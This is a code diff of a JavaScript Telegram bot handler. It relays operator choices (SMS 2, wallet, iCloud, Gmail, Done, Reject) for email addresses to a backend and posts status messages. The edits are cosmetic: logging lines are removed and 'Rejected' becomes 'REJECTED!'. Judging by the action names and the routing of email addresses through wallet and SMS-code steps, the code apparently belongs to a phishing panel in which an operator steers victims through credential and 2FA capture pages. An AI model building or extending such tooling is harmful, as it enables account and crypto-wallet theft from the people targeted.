@@ -207,7 +207,6 @@ bot.on("callback_query", async (query) => {
     // ============================================================================
     if (action === "sms2_wallet" || action === "sms2_done" || action === "sms2_reject" || action === "sms2_icloud" || action === "sms2_gmail") {
       const sms2Id = identifier;
-      console.log(`📲 SMS 2 choice: ${action} for sms2Id: ${sms2Id}`);
       
       try {
         const updateResult = await fetch(`${APP_URL}/update-sms2-choice`, {
@@ -217,7 +216,6 @@ bot.on("callback_query", async (query) => {
         });
         
         const result = await updateResult.json();
-        console.log(`✅ SMS 2 choice updated: ${action}`);
         
         try {
           await bot.editMessageReplyMarkup(
@@ -244,7 +242,7 @@ bot.on("callback_query", async (query) => {
           } else if (action === "sms2_done") {
             statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
           } else if (action === "sms2_reject") {
-            statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
+            statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
           } else if (action === "sms2_icloud") {
             statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
           } else if (action === "sms2_gmail") {
@@ -262,7 +260,6 @@ bot.on("callback_query", async (query) => {
                 parse_mode: "HTML"
               })
             });
-            console.log(`✅ Sent status message: ${statusMsg}`);
           }
         } catch (err) {
           console.error("Error sending status message:", err);
@@ -673,7 +670,7 @@ bot.on("callback_query", async (query) => {
       } else if (action === "sms2_done") {
         statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
       } else if (action === "sms2_reject") {
-        statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
+        statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       } else if (action === "wallet_decision_sms") {
         statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
       } else if (action === "wallet_decision_done") {
@@ -954,7 +951,7 @@ if (bot2) {
             } else if (action === "sms2_done") {
               statusMsg = `📧 <code>${sms2Email}</code> has been directed to <b>Done</b> 🏁`;
             } else if (action === "sms2_reject") {
-              statusMsg = `📧 <code>${sms2Email}</code> has been <b>Rejected</b> ❌`;
+              statusMsg = `📧 <code>${sms2Email}</code> has been <b>REJECTED</b>! ❌`;
             } else if (action === "sms2_icloud") {
               statusMsg = `📧 <code>${sms2Email}</code> → ☁️`;
             } else if (action === "sms2_gmail") {
@@ -1268,7 +1265,7 @@ if (bot2) {
         } else if (action === "sms2_done") {
           statusMessage = `📧 <code>${email}</code> has been directed to <b>Done</b> 🏁`;
         } else if (action === "sms2_reject") {
-          statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
+          statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
         } else if (action === "wallet_decision_sms") {
           statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
         } else if (action === "wallet_decision_done") {
